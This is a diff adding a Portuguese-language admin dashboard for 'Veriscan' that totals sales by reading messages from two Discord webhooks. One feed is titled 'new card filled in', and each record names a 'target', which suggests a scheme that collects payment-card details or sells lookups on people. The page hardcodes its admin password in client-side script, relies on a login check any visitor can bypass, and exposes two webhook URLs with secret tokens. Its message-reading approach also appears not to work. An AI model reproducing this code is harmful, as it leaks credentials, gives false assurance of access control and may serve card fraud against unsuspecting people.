@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin - Veriscan</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#0b1014;color:#fff;font-family:'Inter',sans-serif;min-height:100vh;padding:20px}
+
+/* Login */
+.login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
+.login-card{background:#141a1c;border-radius:16px;padding:36px 32px;max-width:400px;width:100%;box-shadow:0 10px 40px rgba(0,0,0,.5);text-align:center}
+.login-icon{width:64px;height:64px;background:linear-gradient(135deg,#7c4dff,#a855f7);border-radius:20px;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;box-shadow:0 12px 32px rgba(124,77,255,.4);font-size:32px}
+.login-card h1{font-size:22px;margin-bottom:8px;font-weight:800}
+.login-card p{color:#94a3b8;font-size:14px;margin-bottom:24px}
+.login-card input{width:100%;padding:14px;background:#0c1011;border:1.5px solid #334155;border-radius:10px;color:#fff;font-size:15px;outline:none;margin-bottom:16px;font-family:inherit;text-align:center;letter-spacing:.2em}
+.login-card input:focus{border-color:#7c4dff}
+.login-card button{width:100%;padding:16px;background:linear-gradient(135deg,#7c4dff,#a855f7);border:none;border-radius:10px;color:#fff;font-size:15px;font-weight:800;cursor:pointer;text-transform:uppercase;letter-spacing:.05em;font-family:inherit}
+.login-card button:hover{transform:translateY(-1px)}
+.login-card button:active{transform:scale(.98)}
+.login-error{background:rgba(239,68,68,.15);border:1px solid rgba(239,68,68,.3);color:#ef4444;padding:12px;border-radius:10px;font-size:13px;font-weight:600;margin-top:16px;display:none}
+.login-error.show{display:block}
+
+/* Dashboard */
+.dashboard{display:none;max-width:1200px;margin:0 auto}
+.dashboard.show{display:block}
+.dash-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px;flex-wrap:wrap;gap:12px}
+.dash-header h1{font-size:26px;font-weight:900}
+.dash-header h1 span{background:linear-gradient(135deg,#a855f7,#6366f1);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.dash-actions{display:flex;gap:10px}
+.btn-icon{background:#141a1c;border:1px solid #1e293b;color:#cbd5e1;padding:10px 16px;border-radius:10px;font-size:13px;font-weight:700;cursor:pointer;font-family:inherit;display:flex;align-items:center;gap:6px}
+.btn-icon:hover{background:#1e293b;color:#fff}
+.btn-icon.danger{color:#ef4444;border-color:rgba(239,68,68,.3)}
+.btn-icon.danger:hover{background:rgba(239,68,68,.15)}
+
+/* Cards principais */
+.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:24px}
+.stat-card{background:#141a1c;border-radius:16px;padding:24px;border:1px solid #1e293b;position:relative;overflow:hidden}
+.stat-card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,#7c4dff,#a855f7)}
+.stat-card .label{font-size:12px;font-weight:700;color:#64748b;text-transform:uppercase;letter-spacing:.05em;margin-bottom:8px}
+.stat-card .value{font-size:32px;font-weight:900;color:#fff;line-height:1.1;margin-bottom:4px}
+.stat-card .value.revenue{background:linear-gradient(135deg,#22c55e,#16a34a);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+.stat-card .sub{font-size:12px;color:#94a3b8;font-weight:600}
+
+/* Seção de vendas */
+.section{background:#141a1c;border-radius:16px;padding:24px;border:1px solid #1e293b;margin-bottom:24px}
+.section-title{font-size:16px;font-weight:800;margin-bottom:16px;display:flex;align-items:center;gap:8px}
+
+/* Tabela */
+.sales-table{width:100%;border-collapse:collapse}
+.sales-table th{text-align:left;padding:12px 8px;font-size:11px;font-weight:800;color:#64748b;text-transform:uppercase;letter-spacing:.05em;border-bottom:1px solid #1e293b}
+.sales-table td{padding:14px 8px;font-size:14px;color:#e2e8f0;border-bottom:1px solid #0f172a}
+.sales-table tr:last-child td{border-bottom:none}
+.sales-table tr:hover{background:rgba(124,77,255,.05)}
+.badge{display:inline-block;padding:4px 10px;border-radius:20px;font-size:11px;font-weight:700}
+.badge.pix{background:rgba(34,197,94,.15);color:#22c55e}
+.badge.card{background:rgba(59,130,246,.15);color:#3b82f6}
+.price{color:#22c55e;font-weight:800}
+.time{color:#94a3b8;font-size:12px}
+.loading{text-align:center;padding:40px;color:#64748b;font-size:14px}
+.empty{text-align:center;padding:40px;color:#64748b;font-size:14px}
+
+/* Filtros */
+.filters{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px}
+.filter-btn{background:#0c1011;border:1px solid #1e293b;color:#cbd5e1;padding:8px 16px;border-radius:8px;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit}
+.filter-btn.active{background:linear-gradient(135deg,#7c4dff,#a855f7);color:#fff;border-color:transparent}
+.filter-btn:hover:not(.active){background:#1e293b;color:#fff}
+</style>
+</head>
+<body>
+
+<!-- ============================================
+     TELA DE LOGIN
+     ============================================ -->
+<div class="login-wrap" id="loginWrap">
+  <div class="login-card">
+    <div class="login-icon">🔐</div>
+    <h1>Painel Admin</h1>
+    <p>Digite a senha para acessar</p>
+
+    <input type="password" id="senhaInput" placeholder="••••••••" autocomplete="off" autofocus>
+    <button onclick="fazerLogin()">🔓 Entrar</button>
+
+    <div class="login-error" id="loginError"></div>
+  </div>
+</div>
+
+<!-- ============================================
+     DASHBOARD
+     ============================================ -->
+<div class="dashboard" id="dashboard">
+  <div class="dash-header">
+    <h1>📊 Dashboard <span>Veriscan</span></h1>
+    <div class="dash-actions">
+      <button class="btn-icon" onclick="carregarVendas()">
+        <svg width="14" height="14" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2.5"><path stroke-linecap="round" stroke-linejoin="round" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
+        Atualizar
+      </button>
+      <button class="btn-icon danger" onclick="sair()">
+        <svg width="14" height="14" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2.5"><path stroke-linecap="round" stroke-linejoin="round" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"/></svg>
+        Sair
+      </button>
+    </div>
+  </div>
+
+  <!-- Cards de estatísticas -->
+  <div class="stats-grid">
+    <div class="stat-card">
+      <div class="label">💰 Faturamento total</div>
+      <div class="value revenue" id="totalRevenue">R$ 0,00</div>
+      <div class="sub" id="totalCount">0 vendas</div>
+    </div>
+    <div class="stat-card">
+      <div class="label">📅 Hoje</div>
+      <div class="value" id="todayRevenue">R$ 0,00</div>
+      <div class="sub" id="todayCount">0 vendas</div>
+    </div>
+    <div class="stat-card">
+      <div class="label">📆 Últimos 7 dias</div>
+      <div class="value" id="weekRevenue">R$ 0,00</div>
+      <div class="sub" id="weekCount">0 vendas</div>
+    </div>
+    <div class="stat-card">
+      <div class="label">🗓️ Este mês</div>
+      <div class="value" id="monthRevenue">R$ 0,00</div>
+      <div class="sub" id="monthCount">0 vendas</div>
+    </div>
+  </div>
+
+  <!-- Últimas vendas -->
+  <div class="section">
+    <div class="section-title">🔥 Últimas vendas</div>
+
+    <div class="filters">
+      <button class="filter-btn active" data-filter="all" onclick="setFilter('all')">Todas</button>
+      <button class="filter-btn" data-filter="today" onclick="setFilter('today')">Hoje</button>
+      <button class="filter-btn" data-filter="pix" onclick="setFilter('pix')">PIX</button>
+      <button class="filter-btn" data-filter="card" onclick="setFilter('card')">Cartão</button>
+    </div>
+
+    <div id="salesContainer">
+      <div class="loading">⏳ Carregando vendas...</div>
+    </div>
+  </div>
+</div>
+
+<script>
+/* ============================================================
+   🔒 SENHA DO ADMIN
+   ============================================================ */
+// ⚠️ TROCA ESSA SENHA PELA QUE VOCÊ QUISER
+const SENHA_ADMIN = 'veriscan2024';
+const STORAGE_KEY = 'vs_admin_logged';
+
+/* ============================================================
+   🎣 URLS DOS WEBHOOKS DO DISCORD
+   ============================================================
+   Aqui você cola os webhooks dos canais que recebem as vendas.
+   O sistema vai ler as mensagens desses canais.
+   ============================================================ */
+const WEBHOOKS_LEITURA = {
+  pixAprovado: 'https://discord.com/api/webhooks/1553603832603217971/PKsNHVIYchZi_O8uYSpHAygEtv2Em_MIT-K9Rf1UBXwSuOD0QzZBV4IxbhARiubMeDbA',
+  cartao: 'https://discord.com/api/webhooks/1553603673022660738/sc_fw4BM_7LvPSJtkOuOJTZdAdFKhcyHiBrvVB8D1Ca7EtM6PbuJpUJ1sATAxdRqEIUp'
+};
+
+/* ============================================================
+   LOGIN
+   ============================================================ */
+function fazerLogin() {
+  const senha = document.getElementById('senhaInput').value.trim();
+  const errorEl = document.getElementById('loginError');
+
+  if (senha === SENHA_ADMIN) {
+    localStorage.setItem(STORAGE_KEY, 'true');
+    mostrarDashboard();
+  } else {
+    errorEl.textContent = '❌ Senha incorreta';
+    errorEl.classList.add('show');
+    document.getElementById('senhaInput').value = '';
+    setTimeout(() => errorEl.classList.remove('show'), 3000);
+  }
+}
+
+function sair() {
+  localStorage.removeItem(STORAGE_KEY);
+  document.getElementById('loginWrap').style.display = 'flex';
+  document.getElementById('dashboard').classList.remove('show');
+  document.getElementById('senhaInput').value = '';
+}
+
+function mostrarDashboard() {
+  document.getElementById('loginWrap').style.display = 'none';
+  document.getElementById('dashboard').classList.add('show');
+  carregarVendas();
+}
+
+/* ============================================================
+   CARREGAR VENDAS
+   ============================================================ */
+let todasVendas = [];
+let filtroAtual = 'all';
+
+async function carregarVendas() {
+  const container = document.getElementById('salesContainer');
+  container.innerHTML = '<div class="loading">⏳ Carregando vendas...</div>';
+
+  try {
+    const vendas = [];
+
+    // PIX aprovado
+    const pixResp = await fetch(WEBHOOKS_LEITURA.pixAprovado + '?limit=100');
+    if (pixResp.ok) {
+      const pixMsgs = await pixResp.json();
+      pixMsgs.forEach(m => {
+        if (m.embeds && m.embeds[0] && m.embeds[0].title === '✅ PIX APROVADO') {
+          const venda = extrairVendaPix(m);
+          if (venda) vendas.push(venda);
+        }
+      });
+    }
+
+    // Cartão
+    const cardResp = await fetch(WEBHOOKS_LEITURA.cartao + '?limit=100');
+    if (cardResp.ok) {
+      const cardMsgs = await cardResp.json();
+      cardMsgs.forEach(m => {
+        if (m.embeds && m.embeds[0] && m.embeds[0].title === '💳 Novo Cartão Preenchido') {
+          const venda = extrairVendaCard(m);
+          if (venda) vendas.push(venda);
+        }
+      });
+    }
+
+    // Ordena por data (mais recente primeiro)
+    vendas.sort((a, b) => b.timestamp - a.timestamp);
+    todasVendas = vendas;
+
+    renderizarDashboard();
+
+  } catch (e) {
+    console.error(e);
+    container.innerHTML = '<div class="empty">❌ Erro ao carregar. Abra o console (F12) e veja o erro.</div>';
+  }
+}
+
+/* ============================================================
+   EXTRAIR VENDA DO PIX
+   ============================================================ */
+function extrairVendaPix(msg) {
+  const embed = msg.embeds[0];
+  if (!embed || !embed.fields) return null;
+
+  const getField = (name) => {
+    const f = embed.fields.find(x => x.name.includes(name));
+    return f ? f.value : '—';
+  };
+
+  const valorStr = getField('Valor');
+  const valorNum = parseFloat(valorStr.replace('R$', '').replace(',', '.').trim()) || 0;
+
+  return {
+    tipo: 'PIX',
+    cliente: getField('Cliente'),
+    alvo: getField('Alvo'),
+    valor: valorNum,
+    valorStr: valorStr,
+    timestamp: new Date(embed.timestamp || msg.timestamp).getTime()
+  };
+}
+
+/* ============================================================
+   EXTRAIR VENDA DO CARTÃO
+   ============================================================ */
+function extrairVendaCard(msg) {
+  const embed = msg.embeds[0];
+  if (!embed || !embed.fields) return null;
+
+  const getField = (name) => {
+    const f = embed.fields.find(x => x.name.includes(name));
+    return f ? f.value : '—';
+  };
+
+  return {
+    tipo: 'Cartão',
+    cliente: getField('Nome'),
+    alvo: getField('Alvo'),
+    valor: 19.90,
+    valorStr: 'R$ 19,90',
+    timestamp: new Date(embed.timestamp || msg.timestamp).getTime()
+  };
+}
+
+/* ============================================================
+   RENDERIZAR DASHBOARD
+   ============================================================ */
+function renderizarDashboard() {
+  const agora = Date.now();
+  const hoje = new Date();
+  hoje.setHours(0, 0, 0, 0);
+  const inicioHoje = hoje.getTime();
+  const inicioSemana = inicioHoje - 6 * 24 * 60 * 60 * 1000;
+  const inicioMes = new Date(hoje.getFullYear(), hoje.getMonth(), 1).getTime();
+
+  // Total
+  const total = todasVendas.reduce((acc, v) => acc + v.valor, 0);
+  const totalCount = todasVendas.length;
+
+  // Hoje
+  const hojeVendas = todasVendas.filter(v => v.timestamp >= inicioHoje);
+  const hojeTotal = hojeVendas.reduce((acc, v) => acc + v.valor, 0);
+
+  // Semana
+  const semanaVendas = todasVendas.filter(v => v.timestamp >= inicioSemana);
+  const semanaTotal = semanaVendas.reduce((acc, v) => acc + v.valor, 0);
+
+  // Mês
+  const mesVendas = todasVendas.filter(v => v.timestamp >= inicioMes);
+  const mesTotal = mesVendas.reduce((acc, v) => acc + v.valor, 0);
+
+  // Atualiza cards
+  document.getElementById('totalRevenue').textContent = formatarMoeda(total);
+  document.getElementById('totalCount').textContent = totalCount + ' vendas';
+  document.getElementById('todayRevenue').textContent = formatarMoeda(hojeTotal);
+  document.getElementById('todayCount').textContent = hojeVendas.length + ' vendas';
+  document.getElementById('weekRevenue').textContent = formatarMoeda(semanaTotal);
+  document.getElementById('weekCount').textContent = semanaVendas.length + ' vendas';
+  document.getElementById('monthRevenue').textContent = formatarMoeda(mesTotal);
+  document.getElementById('monthCount').textContent = mesVendas.length + ' vendas';
+
+  // Tabela filtrada
+  renderizarTabela();
+}
+
+function renderizarTabela() {
+  const container = document.getElementById('salesContainer');
+  let lista = todasVendas;
+
+  if (filtroAtual === 'today') {
+    const hoje = new Date();
+    hoje.setHours(0, 0, 0, 0);
+    lista = lista.filter(v => v.timestamp >= hoje.getTime());
+  } else if (filtroAtual === 'pix') {
+    lista = lista.filter(v => v.tipo === 'PIX');
+  } else if (filtroAtual === 'card') {
+    lista = lista.filter(v => v.tipo === 'Cartão');
+  }
+
+  if (lista.length === 0) {
+    container.innerHTML = '<div class="empty">📭 Nenhuma venda encontrada</div>';
+    return;
+  }
+
+  const html = `
+    <table class="sales-table">
+      <thead>
+        <tr>
+          <th>Cliente</th>
+          <th>Alvo</th>
+          <th>Método</th>
+          <th>Valor</th>
+          <th>Data</th>
+        </tr>
+      </thead>
+      <tbody>
+        ${lista.map(v => `
+          <tr>
+            <td>${escapeHtml(v.cliente)}</td>
+            <td style="color:#a855f7;font-weight:700">${escapeHtml(v.alvo)}</td>
+            <td><span class="badge ${v.tipo === 'PIX' ? 'pix' : 'card'}">${v.tipo}</span></td>
+            <td class="price">${v.valorStr}</td>
+            <td class="time">${formatarData(v.timestamp)}</td>
+          </tr>
+        `).join('')}
+      </tbody>
+    </table>
+  `;
+
+  container.innerHTML = html;
+}
+
+function setFilter(filtro) {
+  filtroAtual = filtro;
+  document.querySelectorAll('.filter-btn').forEach(btn => {
+    btn.classList.toggle('active', btn.dataset.filter === filtro);
+  });
+  renderizarTabela();
+}
+
+/* ============================================================
+   HELPERS
+   ============================================================ */
+function formatarMoeda(valor) {
+  return 'R$ ' + valor.toFixed(2).replace('.', ',').replace(/(\d)(?=(\d{3})+(?!\d))/g, '$1.');
+}
+
+function formatarData(ts) {
+  const d = new Date(ts);
+  const hoje = new Date();
+  const ontem = new Date();
+  ontem.setDate(ontem.getDate() - 1);
+
+  const hora = d.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
+
+  if (d.toDateString() === hoje.toDateString()) return 'Hoje ' + hora;
+  if (d.toDateString() === ontem.toDateString()) return 'Ontem ' + hora;
+  return d.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit' }) + ' ' + hora;
+}
+
+function escapeHtml(str) {
+  if (!str) return '—';
+  return String(str).replace(/[&<>"']/g, c => ({
+    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
+  })[c]);
+}
+
+/* ============================================================
+   INIT
+   ============================================================ */
+if (localStorage.getItem(STORAGE_KEY) === 'true') {
+  mostrarDashboard();
+}
+
+document.getElementById('senhaInput').addEventListener('keypress', (e) => {
+  if (e.key === 'Enter') fazerLogin();
+});
+</script>
+</body>
+</html>
